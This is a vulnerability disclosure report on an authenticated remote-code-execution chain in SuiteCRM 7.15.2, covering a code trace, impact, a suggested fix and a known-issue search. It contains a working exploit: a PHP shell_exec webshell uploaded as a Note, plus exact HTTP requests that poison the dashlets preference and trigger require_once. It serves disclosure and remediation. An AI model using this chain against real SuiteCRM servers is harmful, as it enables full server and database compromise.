# VULN-011 — Authenticated RCE via dashlet-preference poisoning → `require_once` webshell

## 1. Header
- **Title:** Authenticated RCE via dashlet-preference poisoning → `require_once` of an uploaded file
- **ID:** VULN-011
- **Software:** SuiteCRM · **Repository:** https://github.com/SuiteCRM/SuiteCRM
- **Affected version:** 7.15.2 (`suitecrm_version.php`) — commit-pinned `forkedSuite` snapshot
- **Commit:** `62effd0ceb767ed3b634ade585b19a6633eb4fcb`
- **Severity:** Critical · **CVSS 3.1:** 8.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Status:** CONFIRMED (dynamic)
- **Auth required:** Any authenticated user with Emails + Notes access (both default for a RegularUser). Obtained here by admin creating an ordinary account; in the wild any insider/compromised low-priv login. No admin/role privilege used in the attack.
- **What an attacker gains:** arbitrary PHP/OS command execution as the web user (`www-data`) — full server and database compromise.

## 2. Summary
`SugarController::action_configuredashlet()` builds a filesystem include path and a class name **entirely from the calling user's own `dashlets` preference**, then `require_once`s the path and `new`s the class — with no validation whatsoever. Two low-privilege primitives make this exploitable: (1) the Emails `setPreference` AJAX action writes that preference with no ACL check, and (2) a Note attachment lands on disk verbatim at `upload/<note_guid>` (raw bytes, no extension). An attacker uploads a PHP payload as a Note, points the dashlet `fileLocation` at it, and calls `configuredashlet` — PHP executes the file. Validated end-to-end: a freshly-created non-admin account ran `id` on the server and received `uid=33(www-data)` in the HTTP response.

## 3. How it works (mechanism & code trace)

**Sink — user-controlled include + instantiation.** The exact defect:
```php
// include/MVC/Controller/SugarController.php:882-891
protected function action_configuredashlet()
{
    global $current_user, $mod_strings;
    if (!empty($_REQUEST['id'])) {
        $id = $_REQUEST['id'];                                             // attacker: "pwn"
        $dashletDefs = $current_user->getPreference('dashlets', $_REQUEST['module']); // category from request: "Emails"
        require_once($dashletDefs[$id]['fileLocation']);                   // :889  arbitrary include -> PHP executes
        $dashlet = new $dashletDefs[$id]['className'](                     // :891  arbitrary class instantiation
            $id, (isset($dashletDefs[$id]['options']) ? $dashletDefs[$id]['options'] : array()));
```
`fileLocation`, `className`, `$id`, and the preference **category** (`$_REQUEST['module']`) are all attacker-controlled. There is no `is_file()`, no realpath/basedir confinement, no extension allow-list, and no `is_subclass_of($className,'Dashlet')` check.

**Write primitive — un-gated preference write.** The category the sink reads is exactly the one this action writes:
```php
// modules/Emails/EmailUIAjax.php:1628-1636
case "setPreference":
    if (isset($_REQUEST['prefName']) && isset($_REQUEST['prefValue'])) {
        ...
        $current_user->setPreference($_REQUEST['prefName'], $_REQUEST['prefValue'], '', 'Emails'); // no is_admin / ACL
    }
```
`prefValue` may be a nested array (`prefValue[pwn][fileLocation]=…`) and is stored verbatim. `EmailsController` defines no `action_configuredashlet` override and no `admin_actions` allow-list, so `index.php?module=Emails&action=configuredashlet` runs the inherited base sink for any user, reading `getPreference('dashlets','Emails')` — the bucket `setPreference` just wrote.

**Upload primitive — includable payload on disk.** A Note attachment is moved to `upload/<note_id>` as raw bytes:
```php
// modules/Notes/controller.php:73-100
$upload_file = new UploadFile('uploadfile');
if (isset($_FILES['uploadfile']) && $upload_file->confirm_upload()) { ...; $do_final_move = 1; }
$this->bean->save($check_notify);
if ($do_final_move) { $upload_file->final_move($this->bean->id); }   // -> upload/<note_id>, no extension
```
`require_once('upload/<note_id>')` executes it as PHP regardless of extension. The `upload/.htaccess` returns HTTP 403 for direct web access but does nothing against a filesystem `require_once`.

**Confirmed live.** The `configuredashlet` response contained the payload's output (`response.txt`):
```
RCEMARK_ba8c0cf6:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
and the payload also wrote `upload/rce_<rnd>.txt` with the same `id` output on the server (`evidence/rce_output.txt`).

## 4. Why it is a vulnerability (reasoning)
The trust boundary is *user data vs. server code*. A "dashlet configuration" preference is, by intent, opaque display state a user tweaks for their own home page; the code instead treats two of its fields as a **PHP file path to execute** and a **class to instantiate**. The feature is supposed to grant "arrange my dashboard"; it actually grants "run any file on disk as PHP." Nothing about this is by-design: dashlets are defined by server-side metadata under `include/Dashlets/…`, so a legitimate implementation would resolve `$id` against that registry — the code simply trusts the preference blob instead. A skeptic's "but the user only edits their own preference" misses that the preference is *code input to `require_once`*, and the companion upload primitive lets the same user place the file being included. The demonstrated `www-data` command execution from a non-admin session is the definitive proof that a data-only capability was escalated to code execution.

## 5. Reproduction
From a clean lab (`http://localhost:33116`):

1. **Precondition (scripted):** admin creates a RegularUser (`_common.create_user`); log in as that low-priv user.
2. **Plant payload:** `POST /index.php` multipart, `module=Notes&action=save&name=note_<rnd>`, file field `uploadfile` containing:
   ```php
   <?php echo "\nRCEMARK_<rnd>:".shell_exec('id'); @file_put_contents('upload/rce_<rnd>.txt', shell_exec('id')); ?>
   ```
   Response redirects to `...record=<NID>`; the file is now at `upload/<NID>`.
3. **Poison preference:** `POST /index.php` `module=Emails&action=EmailUIAjax&emailUIAction=setPreference&prefName=dashlets&prefValue[pwn][fileLocation]=upload/<NID>&prefValue[pwn][className]=stdClass`.
4. **Trigger:** `GET /index.php?module=Emails&action=configuredashlet&id=pwn`.

Run it: `./run.sh`. Expected tail:
```
[PROOF] webshell executed — response contains RCEMARK_...:'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[OK] exploit confirmed — arbitrary command execution as the web user; `id` -> 'uid=33(www-data)...'
==> VULN-011: CONFIRMED — low-priv user achieved RCE (require_once of uploaded PHP); id => uid=33(www-data) ...
```
Observable proof: the `id` output in the HTTP response (`response.txt`) and on-server file `upload/rce_<rnd>.txt`. Full capture in `run.log` / `request.http`.

## 6. Impact
Terminal capability: arbitrary code execution as `www-data` from the lowest authenticated privilege. The attacker owns the application, its `config.php` (DB credentials), the entire database, all stored mail/connector/EAPM secrets (decryptable on-box via VULN-036's key material), OAuth signing keys, and the host account the PHP process runs as. Blast radius: the whole instance and host account. This subsumes every lower-severity finding and is the endpoint of multiple chains — e.g. VULN-016/VULN-017 SQLi → crack `admin` hash → admin login → (also) VULN-011; or any phished/stolen low-priv session → VULN-011 directly.

## 7. Suggested fix
In `include/MVC/Controller/SugarController.php` `action_configuredashlet()` (and the twin `action_callmethoddashlet()` at `:856`, plus the Home/MySugar equivalents):
```php
// BEFORE
$dashletDefs = $current_user->getPreference('dashlets', $_REQUEST['module']);
require_once($dashletDefs[$id]['fileLocation']);
$dashlet = new $dashletDefs[$id]['className']($id, ...);
// AFTER — resolve against a server-side registry; never include/instantiate from preferences
$registry = DashletRegistry::all();                 // built from include/Dashlets/* metadata
if (!isset($registry[$id])) { sugar_die('unknown dashlet'); }
$def = $registry[$id];
$file = realpath($def['fileLocation']);
if ($file === false || strpos($file, realpath('include/Dashlets')) !== 0 || !is_file($file)) { sugar_die('bad dashlet'); }
require_once($file);
if (!is_subclass_of($def['className'], 'Dashlet')) { sugar_die('bad dashlet class'); }
$dashlet = new $def['className']($id, ...);
```
Principles: resolve dashlets from a trusted registry (allow-list), never derive an include path or class name from user preferences; if a `fileLocation` must be honored, confine it with `realpath()` under the known dashlet directories + `is_file()` + a base-class allow-list; stop keying `getPreference()`'s category off `$_REQUEST['module']`. Defense-in-depth: store uploads outside the document root so they are never includable, and add an `is_admin` gate to `setPreference` for structural preferences like `dashlets`.

## 8. References
- OWASP WSTG-INPV-11 (Testing for Local File Inclusion); OWASP "File Upload" cheat sheet (store uploads outside webroot, validate content).
- SuiteCRM RCE class lineage: GHSA-c82f-58jv-jfrh, CVE-2026-29102, CVE-2026-71550 (user-controlled include path + payload upload). The `configuredashlet` `fileLocation` sink is a distinct (apparently novel) instance of the class.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 75 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `SuiteCRM configuredashlet fileLocation require_once dashlet preference RCE` — no advisory names `configuredashlet`, `fileLocation`, or a preference-driven include; only CVE-2026-29102, CVE-2026-29103 (ModuleScanner bypass) and CVE-2024-50333 (ParserLabel language-file write) surfaced.
2. `SuiteCRM CVE-2026-29102 GHSA-c82f-58jv-jfrh` — CVE-2026-29102 = GHSA-mr5v-wcgr-98qr "Authenticated RCE in Modules" (CWE-94, PR:H, details withheld in the advisory body, fixed 7.15.1); GHSA-c82f-58jv-jfrh resolves (repo advisory API) to CVE-2024-36415 "Improper Control of Filename for Include Statement ... Unrestricted Upload ... authenticated RCE" (PR:H, fixed 7.14.4, generic text, no component named).
3. `SugarCRM configuredashlet OR callmethoddashlet dashlet preference require_once className vulnerability advisory` — only KIS-2016-06 (`addDashlet` SSRF) and CVE-2014-3244 (RSSDashlet XXE) from the SugarCRM lineage; nothing on the dashlet-preference include.
4. `SuiteCRM dashlet RCE CVE "dashlet" local file inclusion OR require_once advisory 2019 OR 2020 OR 2021 OR 2022` — only unrelated RCEs (CVE-2022-23940, CVE-2021-45897, CVE-2020-28328, CVE-2022-27474).
5. `SuiteCRM EmailUIAjax setPreference user preference injection vulnerability dashlets` — only EmailUIAjax SQLi CVEs (CVE-2026-29099, CVE-2024-36410); the ungated `setPreference` write primitive is not described anywhere.
6. `CVE-2026-29102 SuiteCRM RCE writeup quirmz OR "Reuben Seah" details module` — no public write-up revealing the component of CVE-2026-29102.
7. SuiteCRM 7.15.x release-notes security list + GitHub repo advisory titles (7.15.1, 7.15.2, 20 most recent): RCE entries are GHSA-mr5v (Modules, PR:H), GHSA-5jjq (ModuleScanner), GHSA-cx24-rr7r-mxrg / CVE-2026-71550 (LFI via `aow_action` in AOW_WorkFlow controller), GHSA-4773 (admin Dropdown Editor PHP injection); none is the dashlet preference path. GitHub issue search `configuredashlet fileLocation` / `dashlets preference require_once` — 0 results. `include/MVC/Controller/SugarController.php` has no 2026 commits and `action_configuredashlet()` (:882-:891) is unchanged on the upstream `hotfix` branch as of 2026-10-21.

**Related but distinct public references** (same class or component, not this bug):
- GHSA-c82f-58jv-jfrh / CVE-2024-36415 — same class ("filename for include" + uploaded payload -> RCE) but admin-only (PR:H), fixed in 7.14.4, and the `configuredashlet` sink was left intact, so it addressed a different include site.
- GHSA-mr5v-wcgr-98qr / CVE-2026-29102 — "Authenticated RCE in Modules", admin-only (PR:H), component withheld; sink here still live after its fix (7.15.1).
- GHSA-cx24-rr7r-mxrg / CVE-2026-71550 — LFI-to-RCE via `require_once` of a traversal-controlled `aow_action` in the AOW_WorkFlow controller (different source and controller).
- CVE-2024-50333 / CVE-2026-29103 — ModuleBuilder/ModuleScanner code-injection paths, admin-level.

**Reasoning:** No public source names `SugarController::action_configuredashlet()`, the `dashlets` user-preference `fileLocation`/`className` include, or the `EmailUIAjax setPreference` write primitive, and the sink is unchanged upstream despite three RCE advisories being fixed in the same code line since 2024. All published include/upload RCEs in SuiteCRM require administrator privilege, whereas this chain needs only a regular user, which is a materially different trust boundary. Confidence is 75 rather than higher because two of the related advisories (CVE-2024-36415, CVE-2026-29102) withhold their component details, so an exact overlap cannot be fully excluded even though their fixes demonstrably did not touch this path.
